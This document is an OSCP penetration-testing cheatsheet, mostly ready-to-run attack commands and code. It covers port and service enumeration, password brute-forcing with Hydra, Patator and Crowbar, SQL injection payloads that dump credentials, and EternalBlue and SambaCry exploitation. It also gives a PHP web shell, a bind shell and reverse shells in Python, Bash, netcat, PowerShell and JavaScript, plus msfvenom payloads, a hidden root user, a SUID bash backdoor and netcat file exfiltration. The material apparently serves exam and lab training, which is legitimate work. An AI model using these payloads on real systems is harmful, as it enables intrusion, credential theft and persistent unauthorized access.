## OSCP Cheatsheet
**Author:** Victor Fernandez III

### Table of Contents
| [Enumeration](#enumeration) | [Gaining Access](#gaining-access) | [Maintaining Access](#maintaining-access) |
| --------------------------------- | --------------------------- | ----------------------------------------- |
| [FTP](#ftp) | [Default Credentials](#default-credentials) | [Python Bind Shell](#python-bind-shell) |
| [SSH](#ssh) | [Hydra](#hydra) | [Python Reverse Shell](#python-reverse-shell) |
| [SMTP](#smtp) | [Patator](#patator) | [Bash Reverse Shells](#bash-reverse-shells) |
| [HTTP](#http) | [Crowbar](#crowbar) | [MSFVenom Reverse Shells](#msfvenom-reverse-shells) |
| [POP3](#pop3) | [John the Ripper](#john-the-ripper)| [Netcat Reverse Shells](#netcat-reverse-shells) |
| [RPC](#rpc) | [Hashcat](#hashcat) | [PowerShell Reverse Shell](#powershell-reverse-shell) |
| [NetBIOS](#netbios) | [Local File Inclusions](#local-file-inclusions) | [JavaScript Reverse Shell](#javascript-reverse-shell) |
| [SMB](#smb) | [MS09-050](#ms09-050) | [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation) |
| [Rsync](#rsync) | [EternalBlue](#eternalblue) | [Linux Privilege Escalation](#linux-privilege-escalation) |
| [NFS](#nfs) | [SambaCry](#sambacry) | [Windows Privilege Escalation](#windows-privilege-escalation) |
| [SQL](#sql) | [ShellShock via SMTP](#shellshock-via-smtp) | [Juicy Potato](#juicy-potato) |
| [RDP](#rdp) | [SQL Injection](#sql-injection)| [Persistence](#persistence) |
| [Postgres](#postgres) ||
| [WinRM](#winrm) ||
| [IRC](#irc) ||

### Enumeration
The purpose of the Enumeration phase is to narrow-down the number of possible attack vectors by querying computers within scope and collecting additional information. For your report, summarize open ports, running services, and Operating Systems (OS) in use in a table similar to the one below. 
| IP Address | Ports | Services | OS |
| ---------- | ----- | -------- | --- |
| 10.11.12.13 | 445 | SMB | Windows 10 |
| 10.11.12.23 | 25 | SMTP | Debian Linux |
| 10.11.12.25 | 2049 | NFS | FreeBSD |
| 10.11.12.69 | 22 | SSH | Fedora Linux |
| 10.11.12.123 | 80 | HTTP | Windows Server 2012 R2 |

#### Ports
Declare a variable using the IP address of the target. 
```bash
TARGET=10.11.12.13
```

Scan the 1,000 most common ports. 
```bash
sudo nmap $TARGET -sS -sU -oN scans/$TARGET-nmap-initial
```

Scan all ports. 
```bash
sudo nmap $TARGET -sS -sU -p- -oN scans/$TARGET-nmap-complete
```

#### Services
| Port | Service | Provides |
| ---- | -------- | -------- |
| 21   | FTP      | Credentials, File upload |
| 22   | SSH      | Remote access |
| 25   | SMTP     | Code execution, Credentials |
| 80   | HTTP     | Code execution, Credentials |
| 110  | POP3     | Code execution, Credentials |
| 111  | NFS      | Credentials |
| 135  | RPC      | Enumeration |
| 445  | SMB      | Credentials, Remote access |
| 873  | Rsync    | File upload |
| 6667 | IRC      | Credentials |

#### Versions
```bash
sudo nmap $TARGET -sV -sC $(print-open-ports-from-nmap-scan scans/$TARGET-nmap-complete) -oN scans/$TARGET-nmap-versions
```

#### Operating System
```bash
sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
```

#### FTP
TCP port 21.

I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download).
```bash
mkdir loot
cd loot
```

Create a file to test your ability to upload.
```bash
touch poo.txt
```

Login (try using anonymous:anonymous, anonymous:password, guest:guest, etc.).
```bash
ftp $TARGET 21
```

List files.
```bash
ls
```

List files (using Curl).
```bash
curl ftp://anonymous:anonymous@$TARGET:21
```

Change to Binary mode (an important setting if you're uploading/downloading binary files like pictures and/or executables!).
```bash
binary
```

Download a file.
```bash
get file.txt
```

Download all files.
```bash
mget *
```

Download all files to the current directory (using Wget).
```bash
wget -m ftp://anonymous:anonymous@$TARGET:21 -nd
```

Upload a file.
```bash
put poo.txt
```

End a FTP session.
```bash
exit
```

#### SSH
TCP port 22.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
```

#### SMTP
TCP port 25. 
```bash
telnet $TARGET 25
HELO
VRFY root
QUIT
```

```bash
sudo nmap $TARGET -p25 --script smtp-commands -oN scans/$TARGET-nmap-scripts-smtp-commands
```

```bash
sudo nmap $TARGET -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -oN scans/$TARGET-nmap-scripts-smtp-enum-users
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
```

```bash
sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-vuln
```

#### HTTP
TCP port 80.
```bash
dirb http://$TARGET
dirb http://$TARGET:$PORT/ -o scans/$TARGET-dirb-$PORT-common
dirb http://$TARGET:80 /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-80
```

```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80
```

Nikto Tuning (-T) Options
```bash
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

Scan for misconfigurations.
```bash
nikto -h $TARGET -T 2 -Format txt -o scans/$TARGET-nikto-80-misconfig
```

Scan for SQL injection vulnerabilities.
```bash
nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli
```

Check if the target is vulnerable to Shellshock
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$TARGET-nmap-scripts-80-http-shellshock
```

#### POP3
TCP port 110. 
```bash
telnet $TARGET 110
USER root
PASS root
RETR 1
QUIT
```

#### RPC
TCP port 135.
```bash
rpcclient -U '' $TARGET
srvinfo
netshareenum # print the real file-path of shares; good for accurate RCE
```

#### NetBIOS
TCP port 139.
```bash
nbtscan $TARGET
```

#### SMB
TCP port 445.
```bash
smbclient -L //$TARGET/ # list shares
smbclient -L //$TARGET/ -p $PORT # specify non-standard SMB/Samba port
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET
smbmap -H $TARGET
smbmap -H $TARGET -P $PORT
```

```bash
smbget -R smb://$TARGET/$SHARE
smbget -R smb://$TARGET:$PORT/$SHARE
```

Download files.
```bash
cd loot
smbclient \\\\$TARGET\\$SHARE
prompt
mget *
```

```bash
# check if vulnerable to EternalBlue
sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010
```

```bash
# check if vulnerable to SambaCry
sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-scripts-smb-vuln-cve-2017-7494
```

#### Rsync
TCP port 873.
```bash
sudo nmap $TARGET -p873 --script rsync-list-modules
rsync -av rsync://$TARGET/$SHARE --list-only
rsync -av rsync://$TARGET/$SHARE loot
```

#### NFS
TCP port 2049.
```bash
sudo nmap $TARGET -p111 --script-nfs*
showmount -e $TARGET

sudo mkdir /mnt/FOO
sudo mount //$TARGET:/$SHARE /mnt/FOO

sudo adduser demo
sudo sed -i -e 's/1001/5050/g' /etc/passwd
cat /mnt/FOO/loot.txt
```

#### SQL
TCP port 3306. 
```bash
mysql -u $USER -h $TARGET
```

#### RDP
TCP port 3389.
```bash
sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
```

```bash
rdesktop -u administrator $TARGET
```

#### Postgres
TCP port 5437.
```bash
psql -U postgres -p 5437 -h $TARGET # postgres:postgres
SELECT pg_ls_dir('/');
```

#### WinRM
TCP port 5985
```bash
evil-winrm -u $USER -p $PASSWORD -i $TARGET
```

#### IRC
TCP port 6667.
```bash
irssi -c $TARGET -p $PORT
```

### Gaining Access
#### Default Credentials
```bash
# anonymous:anonymous
# guest:guest
# admin:admin
# admin:adminadmin
```

#### Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

#### Patator
```bash
patator ftp_login host=$TARGET user=$USER password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
```

```bash
patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
```

#### Crowbar
```bash
sudo apt install crowbar # version 0.4.1
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > ./rockyou-UTF8.txt
crowbar -b rdp -s $TARGET/32 -u administrator -C rockyou-UTF8.txt -n 1
```

#### John the Ripper
```bash
unshadow passwd.txt shadow.txt > unshadow.txt
john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password-protected RAR files. 
```bash
rar2john backup.rar > hash.txt
john --format=rar hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Hashcat
Modes
* SHA256: 1400
* SHA512: 1800
* RAR5: 13000

Attacks
* Dictionary: 0

```bash
hashcat -m 1400 -a 0 /path/to/hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash

hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt
```

#### Local File Inclusions
Find a way to upload a PHP command shell.
```bash
echo "<?php echo shell_exec($_GET['cmd']); ?>" > shell.php
```

#### MS09-050  
**CVE-2009-3103: SMBv2 Command Value Vulnerability**  
This vulnerability impacts Windows Server 2008 SP1 32-bit as well as Windows Vista SP1/SP2 and Windows 7.
```bash
nmap $TARGET -p445 --script smb-vuln-cve2009-3103
wget https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py
```

#### EternalBlue  
**CVE-2017-0144**  
This vulnerability impacts Windows. Exploiting it requires access to a Named Pipe (NOTE: Windows Vista and newer does not allow anonymous access to Named Pipes).
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
pip install impacket # mysmb.py ships with this exploit. offsec also hosts it on their GitHub
python checker.py $TARGET # check if target is vulnerable and find an accessible Named Pipe
python zzz_exploit.py $TARGET $NAMED_PIPE
```

#### SambaCry  
**CVE-2017-7494**  
Exploiting this vulnerability depends on your ability to write to a share. Download Proof-of-Concept code from joxeankoret and modify as desired.
```bash
mkdir exploits
cd exploits
git clone https://github.com/joxeankoret/CVE-2017-7494.git
cd CVE-2017-7494
mv implant.c implant.bak
vim implant.c
```

An example of a modified implant.c file. This source file gets compiled by the provided Python script.
```c
#include <stdio.h>
#include <stdlib.h>

static void smash() __attribute__((constructor));

void smash() {
setresuid(0,0,0);
system("ping -c2 $LHOST");
}
```

My example payload sends two ICMP packets to my computer. Therefore, the command sentence below is necessary to confirm the exploit works. If you chose to include a reverse shell, you would run something like `sudo nc -nvlp 443` instead.
```bash
sudo tcpdump -i tun0 icmp
```

Run the exploit.
```bash
python cve_2017_7494.py -t $RHOST --rhost $LHOST --rport $LPORT
```

#### ShellShock via SMTP
**CVE-2014-6271**
```bash
# technique goes here
```

#### Shell via Samba Logon Command
```bash
mkdir /mnt/$TARGET
sudo mount -t cifs //$TARGET/$SHARE /mnt/$TARGET
sudo cp $EXPLOIT /mnt/$TARGET
smbclient //$TARGET/$SHARE
logon "=`$EXPLOIT`"
```

#### SQL Injection
Check for a SQLi vulnerability
```bash
'
```

Check the quality of SQLi vulnerability
```bash
' or 1=1 --
```

Get the number of columns of a table (increment the number until there is an error; ex: if 4 triggers an error, there are 3 columns).
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 --
```

Get all table names (look for user/admin tables).
```sql
' UNION ALL SELECT table_name,null,null FROM all_tables --
```

Get all possible column names within the entire database (look for values like "username" and "password").
```sql
' UNION ALL SELECT column_name,null,null FROM user_tab_cols --
```

Get usernames and passwords from the users table.
```sql
' UNION ALL SELECT username,password,null FROM users --
```

Get usernames and passwords from the admins table.
```sql
' UNION ALL SELECT username,password,null FROM admins --
```

Get the database software version.
```sql
' UNION ALL SELECT banner,null,null FROM v$version --
```
Get the database service account name.
```sql
' UNION ALL SELECT user,null,null FROM dual --
```

Execute a database function (ex: user(), database(), etc.).
```bash
# query goes here
```

Execute shell command (ex: find current working directory).
```bash
# query goes here
```

Common Oracle-based SQL Query Errors
| ID | Error | Explanation |
|---|---|---|
|  ORA-00923 | FROM keyword not found where expected | Occurs when you try to execute a SELECT or REVOKE statement without a FROM keyword in its correct form and place. If you are seeing this error, the keyword FROM is spelled incorrectly, misplaced, or altogether missing. In Oracle, the keyword FROM must follow the last selected item in a SELECT statement or in the case of a REVOKE statement, the privileges. If the FROM keyword is missing or otherwise incorrect, you will see ORA-00923. |
| ORA-00933 | SQL command not properly ended | The SQL statement ends with an inappropriate clause. Correct the syntax by removing the inappropriate clauses.
| ORA-00936 | Missing expression | You left out an important chunk of what you were trying to run. This can happen fairly easily, but provided below are two examples that are the most common occurrence of this issue.The first example is the product of missing information in a SELECT statement. The second is when the FROM clause within the statement is omitted. |
| ORA-01785 | ORDER BY item must be the number of a SELECT-list expression | |
| ORA-01789 | Query block has incorrect number of result columns | |
| ORA-01790 | Expression must have same datatype as corresponding expression | Re-write the SELECT statement so that each matching column is the same data type. Try replacing the columns with null. For example, if you only want to see the table_name and the output is 3 columns, use "table_name,null,null" not "table_name,2,3". |

MySQL Database Queries
```sql
SELECT * FROM targetdb.usertbl; # database.table
USE targetdb;
SELECT * FROM usertbl;
```

Add a new user to a SQL database.
```sql
INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
```

### Maintaining Access
#### Python Bind Shell
```python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

#### Python Reverse Shell
```python
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

#### Bash Reverse Shells
```bash
/bin/bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

#### Msfvenom Reverse Shells
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
```
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$TARGET LPORT=$PORT -f elf -o rshell.elf
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
```
```bash
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
```
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
```

#### Netcat Reverse Shells
```bash
sudo nc -nv 10.10.10.10 443 -e /bin/bash
```
```bash
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### PowerShell Reverse Shell
```bash
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### JavaScript Reverse Shell
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.69.123", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

#### Upgrade to a PTY Shell
```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
export TERM=xterm # be able to clear the screen, etc.
```

#### Information to Gather for Privilege Escalation
| Information | Benefit to Privilege Escalation |
| ----------- | ------------------------------- |
| User Context |Establish who you are before working towards who you want to be. |
| Hostname | Discover the system’s role, naming convention, OS, etc. |
| OS Version | Find matching kernel exploits. |
| Kernel Version | Find matching kernel exploits (exploit the core of the OS). |
| System Architecture | Find matching exploits. |
| Processes and Services | Determine which are running under a privilege account and vulnerable to a known exploit and/or configured with weak permissions. |
| Network Information | Identify pivot options to other machines/networks (adapter configs, routes, TCP connections and their process owners), and determine if anti-virus or virtualization software is running. |
| Firewall Status and Rules | Determine if a service blocked remotely is allowed via loopback; find rules that allow any inbound traffic. |
| Scheduled Tasks | Identify automated tasks running under an administrator-context; find file-paths to files with weak permissions. |
| Programs and Patch Levels | Find matching exploits; HotFixId and InstalledOn represent quality of patch mgmt; qfe = quick fix engineering. |
| Readable/Writable Files and Directories | Find credentials and/or files (that run under a privileged account) that can be modified/overwritten: look for files readable and/or writable by “Everyone,” groups you’re part of, etc. |
| Unmounted Drives | Find credentials. |
| Device Drivers and Kernel Modules | Find matching exploits. |
| AutoElevate Settings and Binaries | Find settings and/or files that run as the file owner when invoked. If AlwaysInstallElevated is enabled, exploit via a malicious .msi file. |

#### Linux Privilege Escalation
```bash
whoami
```
```bash
uname -a
```
```bash
cat /etc/passwd
```
```bash
cat /etc/crontab
```
Files with SUID-bit set. 
```bash
find / -perm -u=s -type f 2> /dev/null 
```
Files where group permissions equal to "writable." 
```bash
find /etc -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```
```bash
ps aux | grep -v "\[" | grep root
```
```bash
dpkg -l # debian
```
```bash
rpm -qa # red hat
```
```bash
pacman -Qe # arch linux
```

#### Windows Privilege Escalation
```bash
whoami /priv
```
```bash
net user
```
```bash
systeminfo
```
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
```bash
dir c:\
```
```bash
dir "c:\program files"
```
```bash
dir "c:\program files (x86)"
```
```bash
wmic service get name,startname
```
```bash
wmic service get name,pathname,startname | findstr "Program Files"
```
```bash
cacls *.exe
```

#### Juicy Potato
* Download Juicy Potato to your attack machine
* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.)
use Juicy Potato to execute your reverse shell

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
```bash
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```

#### Persistence  
Add a new user.
```bash
useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
```

Rootbash (Credit: Tib3rius).
```bash
# as root, create a copy of BASH and then set the SUID-bit
# to resume root-access execute the new binary using -p
cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
/tmp/bash -p
```

Exfil via Netcat.
```bash
nc -nvlp 5050 > stolen.exe
nc.exe -w3 10.11.12.13 5050 < stealme.exe
```
